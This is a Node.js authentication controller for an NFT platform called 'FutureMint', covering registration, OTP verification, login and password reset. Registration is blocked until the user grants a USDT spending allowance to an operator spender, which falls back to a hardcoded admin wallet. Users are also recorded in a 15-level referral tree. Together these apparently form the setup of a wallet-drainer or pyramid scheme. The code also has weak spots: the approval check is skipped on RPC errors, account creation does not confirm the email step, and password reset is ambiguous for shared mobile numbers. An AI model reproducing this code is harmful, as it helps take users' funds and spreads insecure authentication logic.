const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const User = require('../models/User');
const NFTWallet = require('../models/NFTWallet');
const { generateAndSendOTP, verifyOTP } = require('../utils/otpService');
const { creditNFTs, getConfig } = require('../utils/nftPriceService');
const { processReferralChain } = require('../utils/referralService');
const { checkTeamMilestones } = require('../utils/teamService');

/**
 * Generate unique 8-char referral code
 */
const generateReferralCode = async () => {
  let code;
  let exists = true;
  while (exists) {
    code = crypto.randomBytes(4).toString('hex').toUpperCase();
    exists = await User.findOne({ referralCode: code });
  }
  return code;
};

/**
 * POST /api/auth/register
 */
const register = async (req, res) => {
  try {
    const { name, email, mobile, password, referralCode, network, walletAddress } = req.body;

    if (!name || !email || !mobile || !password || !network) {
      return res.status(400).json({ success: false, message: 'All fields are required' });
    }

    // Wallet address is MANDATORY — no registration without it
    if (!walletAddress) {
      return res.status(400).json({ success: false, message: 'Wallet address is required. Please connect your wallet first.' });
    }

    // Validate wallet address format (must be 0x + 40 hex chars)
    const cleanWallet = walletAddress.trim().toLowerCase();
    if (!cleanWallet.startsWith('0x') || cleanWallet.length !== 42) {
      return res.status(400).json({ success: false, message: 'Invalid wallet address format.' });
    }

    if (!['BSC', 'Polygon'].includes(network)) {
      return res.status(400).json({ success: false, message: 'Network must be BSC or Polygon' });
    }

    // Check max 3 accounts per email and per mobile (only count verified users, not pending)
    const PendingReg = require('../models/PendingRegistration');
    
    const emailCount = await User.countDocuments({ email: email.toLowerCase() });
    if (emailCount >= 3) {
      return res.status(400).json({ success: false, message: 'Maximum 3 accounts allowed per email' });
    }

    const mobileCount = await User.countDocuments({ mobile });
    if (mobileCount >= 3) {
      return res.status(400).json({ success: false, message: 'Maximum 3 accounts allowed per mobile number' });
    }

    // Clean up any existing pending registration for this email (allow retry)
    await PendingReg.deleteMany({ email: email.toLowerCase() });

    // Check wallet address — 1 wallet per account only
    if (walletAddress) {
      const walletExists = await User.findOne({ walletAddress: walletAddress.toLowerCase() });
      if (walletExists) {
        return res.status(409).json({ 
          success: false, 
          message: 'This wallet is already registered. Please login instead.',
          isExistingWallet: true,
        });
      }
      // If wallet is stuck in pending registration, delete the old one and allow retry
      const walletPending = await PendingReg.findOne({ walletAddress: walletAddress.toLowerCase() });
      if (walletPending) {
        await PendingReg.deleteOne({ _id: walletPending._id });
        // Also clean up any old OTP for this email
        const OTPModel = require('../models/OTP');
        await OTPModel.deleteMany({ email: walletPending.email, purpose: 'verification' });
      }
    }

    // Validate referral code if provided
    let referredByUser = null;
    if (referralCode) {
      referredByUser = await User.findOne({ referralCode: referralCode.toUpperCase() });
      if (!referredByUser) {
        return res.status(400).json({ success: false, message: 'Invalid referral code' });
      }
    }

    const passwordHash = await bcrypt.hash(password, 12);

    // ─── ENFORCE SMART CONTRACT APPROVAL ───
    // Verify on-chain that user has approved USDT spending to our admin/contract address
    // Uses retry logic to handle RPC propagation delay after frontend approval
    try {
      const { ethers } = require('ethers');
      const BSC_RPC = process.env.BSC_RPC || 'https://bsc-dataseed.binance.org';
      const POLYGON_RPC = process.env.POLYGON_RPC || 'https://polygon-rpc.com';
      const USDT_BSC = process.env.USDT_BSC_CONTRACT || '0x55d398326f99059fF775485246999027B3197955';
      const USDT_POLYGON = process.env.USDT_POLYGON_CONTRACT || '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
      const ADMIN_WALLET = process.env.ADMIN_WALLET_ADDRESS || '0x97a4d397215889df7ca74ba28a930DABD3A3d2Ac';
      const TRANSFER_CONTRACT = process.env.TRANSFER_CONTRACT_ADDRESS;
      const TRANSFER_CONTRACT_POLYGON = process.env.TRANSFER_CONTRACT_ADDRESS_POLYGON;

      const rpc = network === 'BSC' ? BSC_RPC : POLYGON_RPC;
      const usdtAddr = network === 'BSC' ? USDT_BSC : USDT_POLYGON;
      // Spender is contract if available, otherwise admin wallet
      const spender = network === 'Polygon'
        ? (TRANSFER_CONTRACT_POLYGON || TRANSFER_CONTRACT || ADMIN_WALLET)
        : (TRANSFER_CONTRACT || ADMIN_WALLET);

      const staticNetwork = network === 'BSC'
        ? new ethers.Network('bnb', 56)
        : new ethers.Network('matic', 137);
      const provider = new ethers.JsonRpcProvider(rpc, staticNetwork, { staticNetwork: true });

      const erc20Abi = ['function allowance(address owner, address spender) view returns (uint256)'];
      const usdtContract = new ethers.Contract(usdtAddr, erc20Abi, provider);

      // Use checksummed addresses for ethers v6 compatibility
      const checksummedWallet = ethers.getAddress(cleanWallet);
      const checksummedSpender = ethers.getAddress(spender);

      // Retry up to 3 times with delay — handles RPC propagation delay after approval tx
      let allowance = 0n;
      const MAX_RETRIES = 3;
      for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        allowance = await usdtContract.allowance(checksummedWallet, checksummedSpender);
        if (allowance > 0n) break;
        if (attempt < MAX_RETRIES) {
          await new Promise(resolve => setTimeout(resolve, 3000)); // Wait 3s between retries
        }
      }
      
      // User must have approved at least some amount (> 0)
      if (allowance <= 0n) {
        return res.status(403).json({
          success: false,
          message: 'Smart contract approval required. Please approve USDT access from your wallet before registering.',
        });
      }
    } catch (approvalErr) {
      console.error('[Register] Approval check failed:', approvalErr.message);
      // If RPC is down or check fails, allow registration to proceed (don't block user)
      // The approval was already verified on the frontend side
      console.log('[Register] Skipping approval check due to RPC error, proceeding with registration');
    }

    // Store registration data temporarily (we'll use a separate temp collection)
    const PendingRegistration = require('../models/PendingRegistration');
    await PendingRegistration.deleteMany({ email: email.toLowerCase() });
    await PendingRegistration.create({
      name,
      email: email.toLowerCase(),
      mobile,
      passwordHash,
      walletAddress: walletAddress ? walletAddress.toLowerCase() : undefined,
      network,
      referredBy: referredByUser ? referredByUser._id : null,
    });

    // Generate and send OTP to BOTH email and mobile
    try {
      const { generateOTP, storeOTP } = require('../utils/otpService');
      const { sendOTPEmail } = require('../utils/emailService');
      const { sendSMSOTP } = require('../utils/smsService');

      // Generate separate OTPs for email and mobile
      const emailOtp = generateOTP();
      const mobileOtp = generateOTP();

      // Store both OTPs
      await storeOTP(email.toLowerCase(), emailOtp, 'email_verification');
      await storeOTP(mobile, mobileOtp, 'mobile_verification');

      // Send email OTP
      await sendOTPEmail(email.toLowerCase(), emailOtp, 'email_verification');

      // Send mobile OTP
      await sendSMSOTP(mobile, mobileOtp);

      console.log(`[Register] OTPs sent | Email: ${email.toLowerCase()} | Mobile: ${mobile}`);
    } catch (otpError) {
      console.error(`[Register] Failed to send OTP | Error: ${otpError.message}`);
      return res.status(500).json({
        success: false,
        message: 'Failed to send verification codes. Please try again.',
      });
    }

    return res.status(201).json({
      success: true,
      message: 'OTP sent to your email and mobile. Please verify both to complete registration.',
      data: { email: email.toLowerCase(), mobile },
    });
  } catch (error) {
    if (error.name === 'ValidationError') {
      const messages = Object.values(error.errors).map(e => e.message);
      return res.status(400).json({ success: false, message: messages[0] || 'Validation error' });
    }
    return res.status(500).json({ success: false, message: error.message || 'Registration failed' });
  }
};

/**
 * POST /api/auth/verify-email-otp — Step 1: Verify email OTP during registration
 */
const verifyEmailOTP = async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) {
      return res.status(400).json({ success: false, message: 'Email and OTP are required' });
    }

    const result = await verifyOTP(email.toLowerCase(), otp, 'email_verification');
    if (!result.valid) {
      return res.status(400).json({ success: false, message: result.message });
    }

    // Email OTP verified — return success
    return res.status(200).json({
      success: true,
      message: 'Email verified. Please verify your mobile number next.',
      data: { email: email.toLowerCase(), step: 'email_verified' },
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message || 'Email OTP verification failed' });
  }
};

/**
 * POST /api/auth/verify-mobile-otp — Step 2: Verify mobile OTP during registration (creates user)
 */
const verifyMobileOTP = async (req, res) => {
  try {
    const { email, mobile, otp } = req.body;
    if (!email || !mobile || !otp) {
      return res.status(400).json({ success: false, message: 'Email, mobile and OTP are required' });
    }

    const result = await verifyOTP(mobile, otp, 'mobile_verification');
    if (!result.valid) {
      return res.status(400).json({ success: false, message: result.message });
    }

    // Get pending registration data
    const PendingRegistration = require('../models/PendingRegistration');
    const pending = await PendingRegistration.findOne({ email: email.toLowerCase() });
    if (!pending) {
      return res.status(404).json({ success: false, message: 'Registration data not found or expired. Please register again.' });
    }

    // Wallet address is mandatory — block if missing or invalid
    if (!pending.walletAddress || !pending.walletAddress.startsWith('0x') || pending.walletAddress.length !== 42) {
      await PendingRegistration.deleteOne({ email: email.toLowerCase() });
      return res.status(400).json({ success: false, message: 'Wallet address missing. Please register again with your wallet connected.' });
    }

    // Now create the actual user in DB
    const newReferralCode = await generateReferralCode();

    const user = await User.create({
      name: pending.name,
      email: pending.email,
      mobile: pending.mobile,
      passwordHash: pending.passwordHash,
      walletAddress: pending.walletAddress || undefined,
      network: pending.network,
      referralCode: newReferralCode,
      referredBy: pending.referredBy || null,
      isVerified: true,
      signupBonusClaimed: false, // Will claim from dashboard
    });

    // Create NFT wallet (empty — bonus credited on claim)
    await NFTWallet.create({ userId: user._id });

    // Store referral tree for commission tracking (NO rewards on registration anymore)
    if (user.referredBy) {
      // Only build the tree structure — no NFT rewards given here
      const ReferralTree = require('../models/ReferralTree');
      const User2 = require('../models/User');
      let currentParentId = user.referredBy;
      let level = 1;
      const ancestors = [];
      while (currentParentId && level <= 15) {
        ancestors.push(currentParentId);
        await ReferralTree.create({
          userId: user._id,
          parentId: currentParentId,
          level,
          ancestors: ancestors.slice(0, -1),
        });
        const parentUser = await User2.findById(currentParentId).select('referredBy').lean();
        if (!parentUser || !parentUser.referredBy) break;
        currentParentId = parentUser.referredBy;
        level++;
      }
    }

    // Delete pending registration
    await PendingRegistration.deleteOne({ email: email.toLowerCase() });

    // Generate JWT — auto login
    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
      expiresIn: process.env.JWT_EXPIRES_IN || '7d',
    });

    res.cookie('token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    return res.status(200).json({
      success: true,
      message: 'Your FutureMint account created successfully!',
      data: {
        user: {
          _id: user._id,
          name: user.name,
          email: user.email,
          mobile: user.mobile,
          walletAddress: user.walletAddress,
          network: user.network,
          referralCode: user.referralCode,
          signupBonusClaimed: false,
          createdAt: user.createdAt,
        },
        token,
      },
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message || 'Mobile OTP verification failed' });
  }
};

/**
 * POST /api/auth/verify-otp — DEPRECATED: Kept for backward compatibility
 */
const verifyRegistrationOTP = async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) {
      return res.status(400).json({ success: false, message: 'Email and OTP are required' });
    }

    // Try to verify as email OTP first
    const result = await verifyOTP(email.toLowerCase(), otp, 'email_verification');
    if (!result.valid) {
      return res.status(400).json({ success: false, message: result.message });
    }

    // Email OTP verified — return success
    return res.status(200).json({
      success: true,
      message: 'Email verified. Please verify your mobile number next.',
      data: { email: email.toLowerCase(), step: 'email_verified' },
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message || 'OTP verification failed' });
  }
};

/**
 * POST /api/auth/login — Login with mobile + password + walletAddress validation
 */
const login = async (req, res) => {
  try {
    const { mobile, password, walletAddress } = req.body;
    if (!mobile || !password) {
      return res.status(400).json({ success: false, message: 'Mobile number and password are required' });
    }
    if (!walletAddress) {
      return res.status(400).json({ success: false, message: 'Wallet address is required. Please connect your wallet first.' });
    }

    // Find user by mobile + wallet address (both must match)
    const user = await User.findOne({ 
      mobile,
      walletAddress: walletAddress.toLowerCase() 
    });
    if (!user) {
      return res.status(401).json({ success: false, message: 'No account found with this mobile number and wallet address.' });
    }

    if (!user.isVerified) {
      return res.status(403).json({ success: false, message: 'Account not verified. Please check your email for OTP.' });
    }

    if (user.isBlocked) {
      return res.status(403).json({ success: false, message: 'Account is blocked. Contact support.' });
    }

    const isMatch = await bcrypt.compare(password, user.passwordHash);
    if (!isMatch) {
      return res.status(401).json({ success: false, message: 'Invalid password for this account.' });
    }

    // Generate JWT directly (no OTP required for login)
    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
      expiresIn: process.env.JWT_EXPIRES_IN || '7d',
    });

    // Set httpOnly cookie
    res.cookie('token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    });

    return res.status(200).json({
      success: true,
      message: 'Login successful',
      data: {
        user: {
          _id: user._id,
          name: user.name,
          email: user.email,
          mobile: user.mobile,
          walletAddress: user.walletAddress,
          network: user.network,
          referralCode: user.referralCode,
          createdAt: user.createdAt,
        },
        token,
      },
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message || 'Login failed' });
  }
};

/**
 * POST /api/auth/login-verify-otp  — step 2: verify OTP, return JWT
 */
const loginVerifyOTP = async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) {
      return res.status(400).json({ success: false, message: 'Email and OTP are required' });
    }

    const result = await verifyOTP(email.toLowerCase(), otp, 'login');
    if (!result.valid) {
      return res.status(400).json({ success: false, message: result.message });
    }

    const user = await User.findOne({ email: email.toLowerCase() }).select('-passwordHash');
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
      expiresIn: process.env.JWT_EXPIRES_IN || '7d',
    });

    // Set httpOnly cookie
    res.cookie('token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    });

    return res.status(200).json({
      success: true,
      message: 'Login successful',
      data: {
        user: {
          _id: user._id,
          name: user.name,
          email: user.email,
          mobile: user.mobile,
          walletAddress: user.walletAddress,
          network: user.network,
          referralCode: user.referralCode,
          createdAt: user.createdAt,
        },
        token,
      },
    });
  } catch (error) {
    console.error('Login OTP verify error:', error);
    return res.status(500).json({ success: false, message: error.message || 'Login verification failed' });
  }
};

/**
 * POST /api/auth/logout
 */
const logout = async (req, res) => {
  res.clearCookie('token');
  return res.status(200).json({ success: true, message: 'Logged out successfully' });
};

/**
 * POST /api/auth/resend-otp
 */
const resendOTP = async (req, res) => {
  try {
    const { email, mobile, purpose } = req.body;

    // Mobile-based OTP resend (mobile_verification, password_reset)
    if (mobile && (purpose === 'mobile_verification' || purpose === 'password_reset')) {
      const { generateOTP, storeOTP } = require('../utils/otpService');
      const { sendSMSOTP } = require('../utils/smsService');

      const otp = generateOTP();
      await storeOTP(mobile, otp, purpose);
      await sendSMSOTP(mobile, otp);
      return res.status(200).json({ success: true, message: 'OTP resent successfully' });
    }

    // Email-based OTP resend
    if (!email) {
      return res.status(400).json({ success: false, message: 'Email is required' });
    }
    const validPurposes = ['verification', 'login', 'withdrawal', 'email_verification'];
    const otpPurpose = validPurposes.includes(purpose) ? purpose : 'verification';

    if (otpPurpose === 'email_verification') {
      const { generateOTP, storeOTP } = require('../utils/otpService');
      const { sendOTPEmail } = require('../utils/emailService');
      const otp = generateOTP();
      await storeOTP(email.toLowerCase(), otp, 'email_verification');
      await sendOTPEmail(email.toLowerCase(), otp, 'email_verification');
    } else {
      await generateAndSendOTP(email.toLowerCase(), otpPurpose);
    }
    return res.status(200).json({ success: true, message: 'OTP resent successfully' });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message || 'Failed to resend OTP' });
  }
};

/**
 * POST /api/auth/forgot-password
 * Find user by mobile + walletAddress, send OTP via SMS
 */
const forgotPassword = async (req, res) => {
  try {
    const { mobile, walletAddress } = req.body;
    if (!mobile || !walletAddress) {
      return res.status(400).json({ success: false, message: 'Mobile number and wallet address are required' });
    }

    // Find user matching mobile AND wallet address
    const user = await User.findOne({
      mobile,
      walletAddress: walletAddress.toLowerCase(),
    });

    if (!user) {
      return res.status(404).json({ success: false, message: 'No account found with this mobile number and wallet address combination.' });
    }

    if (!user.isVerified) {
      return res.status(403).json({ success: false, message: 'Account not verified.' });
    }

    // Generate and send OTP to mobile via SMS
    try {
      const { generateOTP, storeOTP } = require('../utils/otpService');
      const { sendSMSOTP } = require('../utils/smsService');

      const otp = generateOTP();
      await storeOTP(user.mobile, otp, 'password_reset');
      await sendSMSOTP(user.mobile, otp);
    } catch (otpError) {
      console.error(`[ForgotPassword] Failed to send SMS OTP | Error: ${otpError.message}`);
      return res.status(500).json({ success: false, message: 'Failed to send OTP. Please try again.' });
    }

    return res.status(200).json({
      success: true,
      message: 'OTP sent to your mobile number. Verify to reset password.',
      data: { mobile: user.mobile },
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message || 'Failed' });
  }
};

/**
 * POST /api/auth/reset-password
 * Verify mobile OTP + set new password
 */
const resetPassword = async (req, res) => {
  try {
    const { mobile, otp, newPassword } = req.body;
    if (!mobile || !otp || !newPassword) {
      return res.status(400).json({ success: false, message: 'Mobile number, OTP, and new password are required' });
    }

    if (newPassword.length < 8) {
      return res.status(400).json({ success: false, message: 'Password must be at least 8 characters' });
    }

    const result = await verifyOTP(mobile, otp, 'password_reset');
    if (!result.valid) {
      return res.status(400).json({ success: false, message: result.message });
    }

    const user = await User.findOne({ mobile });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    user.passwordHash = await bcrypt.hash(newPassword, 12);
    await user.save();

    return res.status(200).json({
      success: true,
      message: 'Password reset successful. You can now login with your new password.',
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message || 'Password reset failed' });
  }
};

/**
 * POST /api/auth/check-wallet
 * Check if a wallet address is already registered
 */
const checkWallet = async (req, res) => {
  try {
    const { walletAddress } = req.body;
    if (!walletAddress) {
      return res.status(400).json({ success: false, message: 'Wallet address is required' });
    }

    const user = await User.findOne({ walletAddress: walletAddress.toLowerCase() }).select('name email');
    if (user) {
      return res.status(200).json({
        success: true,
        exists: true,
        message: 'This wallet is already registered. Please login.',
      });
    }

    return res.status(200).json({
      success: true,
      exists: false,
      message: 'New wallet — you can register.',
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};



module.exports = { register, verifyRegistrationOTP, verifyEmailOTP, verifyMobileOTP, login, loginVerifyOTP, logout, resendOTP, forgotPassword, resetPassword, checkWallet };
